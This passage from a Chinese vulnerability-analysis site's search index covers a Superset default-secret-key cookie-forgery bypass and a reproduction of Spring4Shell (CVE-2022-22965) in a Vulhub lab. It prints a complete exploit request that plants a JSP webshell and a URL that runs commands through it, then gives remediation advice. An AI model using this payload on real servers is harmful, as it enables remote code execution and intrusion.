<p>\u8865\u4e01\u4ee3\u7801\u4e2d\uff0c\u65b0\u5efa\u4e86\u5224\u65ad\u7528\u6237\u662f\u5426\u4f7f\u7528\u4e86\u9ed8\u8ba4\u7684Key\u8fdb\u884c\u914d\u7f6e\uff0c\u5982\u679c\u4e3a\u9ed8\u8ba4\u7684Key\uff0c\u5c31\u76f4\u63a5\u4e2d\u65ad\u542f\u52a8,\u3002\u4f46\u5728 Docker\u7684 en</p> <p>v \u4e0b\u8fd8\u662f\u6dfb\u52a0\u4e86\u56fa\u5b9a\u7684 Key: TEST_NON_DEV_SECRET\u3002</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_11","title":"\u5206\u6790","text":"<p>\u611f\u89c9\u8fd9\u4e2a\u6f0f\u6d1e\u6709\u70b9\u50cf\u524d\u6bb5\u65f6\u95f4\u7206\u51fa\u6765\u7684 nacos \u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e \u5b58\u5728\u9ed8\u8ba4\u7684\u5bc6\u94a5</p> <p></p> <p>Superset \u662f\u7528 Python \u7f16\u5199\u7684\uff0c\u57fa\u4e8e Flask Web \u6846\u67b6\u3002\u57fa\u4e8e Flask \u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u5e38\u89c1\u505a\u6cd5\u662f\u4f7f\u7528\u52a0\u5bc6\u7b7e\u540d\u7684\u4f1a\u8bdd cookie \u8fdb\u884c\u7528\u6237\u72b6\u6001\u7ba1\u7406\u3002\u5f53\u7528\u6237\u767b\u5f55\u65f6\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u5c06\u5305\u542b\u7528\u6237\u6807\u8bc6\u7b26\u7684\u4f1a\u8bdd cookie \u53d1\u9001\u56de\u6700\u7ec8\u7528\u6237\u7684\u6d4f\u89c8\u5668\u3002Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528 SECERT_KEY \u5bf9 cookie \u8fdb\u884c\u7b7e\u540d\uff0c\u8be5\u503c\u5e94\u8be5\u65f6\u968f\u673a\u751f\u6210\u7684\uff0c\u901a\u5e38\u5b58\u50a8\u5728\u672c\u5730\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e2a Web \u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u90fd\u4f1a\u5c06\u5df2\u7b7e\u540d\u7684\u4f1a\u8bdd cookie \u53d1\u9001\u56de\u5e94\u7528\u7a0b\u5e8f\uff0c\u7136\u540e\u5e94\u7528\u7a0b\u5e8f\u9a8c\u8bc1 cookie \u4e0a\u7684\u7b7e\u540d\u4ee5\u5904\u7406\u8bf7\u6c42\u4e4b\u524d\u91cd\u65b0\u9a8c\u8bc1\u7528\u6237\u3002\u521d\u6b21\u8bf7\u6c42\u65f6\u4f1a\u83b7\u53d6\u5230 Cookie, \u4f7f\u7528\u9ed8\u8ba4Key\u9a8c\u8bc1 Cookie\u662f\u5426\u53ef\u88ab\u4f2a\u9020</p> <p></p> <p>\u9996\u5148\u5c31\u662f\u8bf7\u6c42\u7684\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u770b\u5230 cookie \u503c \u53ef\u4ee5\u89e3\u7801\u6210\u529f\uff0c\u901a\u8fc7\u7206\u7834\uff08\u5f53\u7136\u6211\u4eec\u8fd9\u91cc\u662f\u5df2\u7ecf\u5df2\u77e5\u8fd9\u4e2a key \u503c\uff09\uff0c\u4f2a\u9020\u751f\u6210\u7528\u6237\u7684 cookie\uff0c\u66ff\u6362\u6570\u636e\u5305\u4e2d\u7684cookie \u503c\uff0c\u5c31\u6210\u529f\u767b\u5f55\u6210\u529f\uff0c\u4e4b\u540e\u518d\u6b21\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u6211\u4eec\u6dfb\u52a0\u7684\u5b57\u6bb5\u5df2\u7ecf\u88ab\u4fdd\u5b58\u5728 session \u503c\u4e2d\u3002\u767b\u9646\u4e3b\u9875\u9762\u89c2\u5bdf\u4e3b\u8981\u53c2\u6570,\u901a\u8fc7\u8bbe\u7f6e\u53c2\u6570 user_id \u548c _user_id \u4e3a 1 ,\u6784\u9020\u52a0\u5bc6Cookie</p> <p></p> <p>\u5229\u7528\u6784\u9020\u7684 Cookie\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 Web\u540e\u53f0\u7ba1\u7406\u6743\u9650, \u540e\u53f0\u4e2d\u5b58\u5728\u6570\u636e\u5e93\u8bed\u53e5\u6267\u884c\u6a21\u5757\uff0c\u901a\u8fc7\u8bbe\u7f6e\u5141\u8bb8\u6267\u884c\u5176\u4ed6\u6570\u636e\u5e93\u8bed\u53e5\u540e\u5229\u7528\u6570\u636e\u5e93\u8bed\u53e5 RCE\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html","title":"Spring Framework\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2022-22965\u590d\u73b0\u4e0e\u5206\u6790","text":""},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_1","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Spring Framework\u662f\u4e00\u4e2a\u5f00\u6e90\u5e94\u7528\u6846\u67b6\uff0c\u521d\u8877\u662f\u4e3a\u4e86\u964d\u4f4e\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u7684\u590d\u6742\u5ea6\uff0c\u5177\u6709\u5206\u5c42\u4f53\u7cfb\u7ed3\u6784\uff0c\u5141\u8bb8\u7528\u6237\u9009\u62e9\u7ec4\u4ef6\uff0c\u540c\u65f6\u8fd8\u4e3a J2EE \u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u63d0\u4f9b\u4e86\u4e00\u4e2a\u597d\u7528\u7684\u6846\u67b6\u3002\u5f53Spring\u90e8\u7f72\u5728JDK9\u53ca\u4ee5\u4e0a\u7248\u672c\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5199\u5165\u6076\u610f\u4ee3\u7801\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<ul> <li>Spring Framework &lt; 5.3.18</li> <li>Spring Framework &lt; 5.2.20</li> </ul>"},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_4","title":"\u73af\u5883\u642d\u5efa","text":"<p>\u672c\u6b21\u590d\u73b0\u91c7\u7528Vulhub\u9776\u573a\u73af\u5883\uff0c\u9700\u8981\u5728\u672c\u5730\u642d\u5efaVulhub\u9776\u573a</p> <pre><code>cd /vulhub/spring/CVE-2022-22965\ndocker-compose up -d\n</code></pre> <p></p> <p>\u6839\u636eVULHUB\u9776\u573a\u63d0\u793a\u64cd\u4f5c\uff0c\u8bbf\u95ee\u9776\u573a\u670d\u52a1\u5668IP+\u7aef\u53e3\uff1a</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_5","title":"\u6f0f\u6d1e\u6d4b\u8bd5","text":"<p>\u53d1\u9001\u4ee5\u4e0b\u8bf7\u6c42\u4ee5\u66f4\u6539 Apache Tomcat \u4e2d\u7684\u65e5\u5fd7\u8bb0\u5f55\u914d\u7f6e\u5e76\u5c06\u65e5\u5fd7\u5199\u5165 JSP \u6587\u4ef6\uff1a</p> <pre><code>GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1\nHost: 192.168.32.132:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)   AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71      Safari/537.36\nConnection: close\nsuffix: %&gt;//\nc1: Runtime\nc2: &lt;%\nDNT: 1\n</code></pre> <p></p> <p>\u7136\u540e\uff0c\u8bbf\u95ee\u521a\u624d\u7684 JSP webshell\uff0c\u5e76\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff1a</p> <pre><code>http://192.168.106.128:8080/tomcatwar.jsp?pwd=j&amp;cmd=id\n</code></pre> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_6","title":"\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u6765\u68c0\u6d4b\u6f0f\u6d1e\u662f\u5426\u5b58\u5728:</p> <pre><code>https://github.com/hypnoticp/Python_script\n</code></pre> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_7","title":"\u4fee\u590d\u5efa\u8bae","text":"<ul> <li> <p>\u5728\u4f7f\u7528Spring\u6846\u67b6\u7684\u670d\u52a1\u5668\u4e2d\uff0c\u547d\u4ee4\u884c\u4e0b\u6267\u884c\u201cjava \u2013version\u201d\uff0c\u67e5\u770b\u5f53\u524dJDK\u7248\u672c\uff0c\u5982\u679cJDK\u7248\u672c\u57288\u53ca\u4ee5\u4e0b\uff0c\u5219\u4e0d\u53d7\u6b64\u6f0f\u6d1e\u5f71\u54cd</p> </li> <li> <p>\u5728\u5e94\u7528\u4e2d\u5168\u5c40\u641c\u7d22@InitBinder\u6ce8\u89e3\uff0c\u770b\u770b\u65b9\u6cd5\u4f53\u5185\u662f\u5426\u8c03\u7528dataBinder.setDisallowedFields\u65b9\u6cd5\uff0c\u5982\u679c\u53d1\u73b0\u6b64\u4ee3\u7801\u7247\u6bb5\u7684\u5f15\u5165,\u5219\u5728\u539f\u6765\u7684\u9ed1\u540d\u5355\u4e2d\uff0c\u6dfb\u52a0{\u201cclass.\",\"Class.\u201d,\u201c.class.\u201d,\u201c.Class.\u201d}\u3002</p> </li> <li>\u5728\u5e94\u7528\u7cfb\u7edf\u7684\u9879\u76ee\u5305\u4e0b\u65b0\u5efa\u4ee5\u4e0b\u5168\u5c40\u7c7b\uff0c\u5e76\u4fdd\u8bc1\u8fd9\u4e2a\u7c7b\u88abSpring \u52a0\u8f7d\u5230(\u63a8\u8350\u5728Controller\u6240\u5728\u7684\u5305\u4e2d\u6dfb\u52a0)\u3002\u5b8c\u6210\u7c7b\u6dfb\u52a0\u540e\uff0c\u9700\u5bf9\u9879\u76ee\u8fdb\u884c\u91cd\u65b0\u7f16\u8bd1\u6253\u5305\u548c\u529f\u80fd\u9a8c\u8bc1\u6d4b\u8bd5\uff0c\u5e76\u91cd\u65b0\u53d1\u5e03\u9879\u76ee</li> <li>\u5f53\u524d Spring Framework \u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u7248\u672c\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237\u53ca\u65f6\u66f4\u65b0\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\u3002\u94fe\u63a5\u5982\u4e0b\uff1ahttps://github.com/spring-projects/spring-framework/tags</li> </ul>"},{"location":"Vulnerability_analysis/CVE/CVE-4/CVE4.html#_8","title":"\u6f0f\u6d1e\u539f\u7406\u5206\u6790","text":"<p>https://paper.seebug.org/1877/#_1</p>"}]}